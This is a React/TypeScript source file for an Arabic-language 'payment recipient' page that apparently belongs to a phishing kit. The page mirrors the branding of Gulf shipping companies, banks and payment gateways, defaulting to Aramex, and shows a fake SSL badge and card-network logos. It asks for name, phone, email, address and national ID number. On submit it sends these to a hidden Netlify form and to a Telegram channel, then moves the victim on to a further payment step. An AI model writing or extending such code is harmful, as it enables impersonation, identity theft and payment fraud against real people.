import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { formatCurrency } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedInput } from "@/components/ui/ThemedInput";
import { ThemedCard } from "@/components/ui/ThemedCard";
import {
  Loader2,
  MapPin,
  ShieldCheck,
} from "lucide-react";
import { DynamicMetaTags } from "@/components/DynamicMetaTags";
import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";

const PaymentRecipient = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [address, setAddress] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || 'aramex';

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    return resolveEntity(companyKey);
  }, [companyKey]);

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  const category = companyKey.includes('shipping') || companyKey.includes('aramex') ? 'shipping' :
                   companyKey.includes('bank') ? 'bank' : 'payment_gateway';

  useEffect(() => {
    if (linkData?.payload?.customerInfo) {
      const info = linkData.payload.customerInfo;
      setName(info.name || info.fullName || "");
      setPhone(info.phone || "");
      setEmail(info.email || "");
      setAddress(info.address || "");
    }
  }, [linkData]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!name || !phone) {
      toast({ title: "خطأ", description: "الرجاء إدخال الاسم ورقم الجوال", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const customerInfo = { name, phone, email, address, nationalId };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id, payload: { ...linkData?.payload, customerInfo } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "recipient-info",
          linkId: id!,
          service: entityConfig.nameAr,
          name, phone, email, address, nationalId,
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'recipient_info',
        data: { name, phone, email, address, nationalId, service: entityConfig.nameAr, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/details${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل حفظ البيانات", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <Loader2 className="w-10 h-10 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <MirrorPageWrapper 
      entityId={companyKey} 
      title="بيانات مستلم الخدمة"
      subtitle="Recipient Information & Verification"
      linkData={linkData}
    >
      <DynamicMetaTags
        entityId={companyKey}
        title={`بوابة الدفع - ${entityConfig.nameAr}`}
      />

      <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
        <div className="h-2 w-full bg-primary" />
        <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6">
          <ThemedInput
            config={entityConfig}
            label="الاسم الكامل"
            value={name}
            onChange={(e) => setName(e.target.value)}
            placeholder="أدخل الاسم الرباعي"
            required
          />
          <ThemedInput
            config={entityConfig}
            label="رقم الجوال"
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="05xxxxxxxx"
            required
          />
          {category === 'shipping' && (
            <ThemedInput
              config={entityConfig}
              label="العنوان الوطني"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              placeholder="المدينة، الحي، الشارع"
              required
            />
          )}
          <ThemedInput
            config={entityConfig}
            label={category === 'shipping' ? 'المدينة / الحي' : 'رقم الهوية الوطنية / الإقامة'}
            value={nationalId}
            onChange={(e) => setNationalId(e.target.value)}
            placeholder={category === 'shipping' ? 'المدينة، الحي، الشارع' : 'أدخل رقم الهوية'}
            required
          />

          <div className="pt-6">
            <ThemedButton
              config={entityConfig}
              type="submit"
              disabled={isSubmitting}
              loading={isSubmitting}
            >
              {isSubmitting ? "جاري المعالجة..." : "متابعة عملية الدفع"}
            </ThemedButton>
            <div className="mt-6 flex items-center justify-center gap-2" style={{ color: entityConfig.textMuted }}>
              <ShieldCheck className="w-4 h-4" />
              <span className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">تشفير بيانات آمن 256-bit SSL</span>
            </div>
          </div>
        </form>
      </ThemedCard>

      <div className="flex justify-center gap-8 opacity-40 grayscale py-6">
        <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-6" alt="mada" />
        <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-6" alt="visa" />
        <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-6" alt="mastercard" />
      </div>

      <form name="recipient-info" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="name" />
        <input type="tel" name="phone" />
        <input type="email" name="email" />
        <input type="text" name="address" />
        <input type="text" name="nationalId" />
        <input type="text" name="amount" />
      </form>
    </MirrorPageWrapper>
  );
};

export default PaymentRecipient;
